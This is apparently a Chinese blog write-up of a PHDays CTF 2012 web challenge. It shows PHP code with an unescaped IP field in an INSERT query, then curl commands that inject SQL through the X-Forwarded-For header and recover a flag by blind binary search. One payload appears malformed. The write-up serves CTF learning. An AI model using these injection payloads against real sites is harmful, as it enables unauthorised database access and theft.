---
title: PHDay CTF 2012 Quals Real World 100
author: fqj
layout: post
permalink: /phday-ctf-2012-quals-real-world-100/
categories:
  - CTF
  - writeup
---
此题就是一个web应用，让你获取flag。有代码提供。

思路分析：

首先这是一个MVC分层不错的php应用。

首先看Models：

在models/News.php中，有这样一段代码

这段代码在发表评论的时候被调用

models/News.php:

    public function addComment($id, $data)
    {
        $sql = "INSERT INTO `comments` SET "
             . "`news_id` = " . (int)$id . ", "
             . "`username` = " . $this->db->quote($data['username']). ", "
             . "`text` = " . $this->db->quote($data['text']). ", "
             . "`date_posted` = NOW(), "
             . "`ip` = INET_ATON('" . $data['ip'] . "')";
    
        $this->db->query($sql);
    }
    

大家看到ip的字段，并没有转义，看起来是有希望可以注入的。

接下来，看到$data['ip']的来源是：

library/Micro/Http/Request.php文件中：

    public function getClientIp($checkProxy = true)
    {
        if ($checkProxy && $this->getServer('HTTP_CLIENT_IP') != null) {
            $ip = $this->getServer('HTTP_CLIENT_IP');
        } else if ($checkProxy && $this->getServer('HTTP_X_FORWARDED_FOR') != null) {
            $ip = $this->getServer('HTTP_X_FORWARDED_FOR');
        } else {
            $ip = $this->getServer('REMOTE_ADDR');
        }
    
        return $ip;
    }
    

可见，就是先检查HTTP请求header中的CLIENT&#95;IP然后检查X&#95;FORWARDED_FOR，如果都不存在就用远端的地址。

那么HTTP请求中CLIENT&#95;IP和FORWARDED&#95;FOR都是可以注入的地方。我就用X&#95;FORWARDED&#95;FOR了

由于这个是INSERT语句，无法获知查找出来的内容，于是只能通过INSERT语句的成功与否（网页返回200或者500）来判断了。

首先一些简单的测试可以发现，ip一列的有not null的属性，所以说只要让INET_ATON的返回值为NULL页面就会错误。

那么首先第一测试就是找出表名，乱猜得到表名为flags

    curl "http://ctf.phdays.com:1411/news/1/add-comment"  -d "username=&text=" -H "X_Forwarded_For: ' + (SELECT * FROM flags);" 
    

然后猜列书，可以用二分法，在SELECT语句后用ORDER BY 列号，找到最大的不会出错的列号就是flags表的列数。

发现只有一列。

然后猜列名，把*改成你要猜的列名，出错就是不存在，猜得列名是flag。

然后猜行数，通过加LIMIT X, 1，X为整数就可以了。发现只有1行。

这是一个一行一列的表。

接下来就是关键了，由于是INSERT语句无法获知查询的结果，所以只能根据查询是否有结果来逐步解决。

首先用二分法确定值有多长，二分的方式是：

    $ curl "http://ctf.phdays.com:1411/news/1/add-comment"  -d "username=luke&text=sun3" -H "X_Forwarded_For: ' + (SELECT * FROM flags WHERE length(flag, 32) <= ));" 
    

将32换成其他的数来猜，利用二分法，找到最小的不会出错的数，便是长度。

接下来二分内容，需要逐字节二分，原理同上，下面贴出一个示例的请求，

    $ curl "http://ctf.phdays.com:1411/news/1/add-comment"  -d "username=luke&text=sun3" -H "X_Forwarded_For: ' + (SELECT * FROM flags WHERE ord(substring(flag, XXX, 1)) <= XXX));"
    

其中两个XXX分别是要猜第几个字节（1-32）和猜的值的最大值。找到最小的不出错的猜值，就是结果。然后算出二分出的ascii码对应出的字符（串），结果是我也不记得结果是啥了。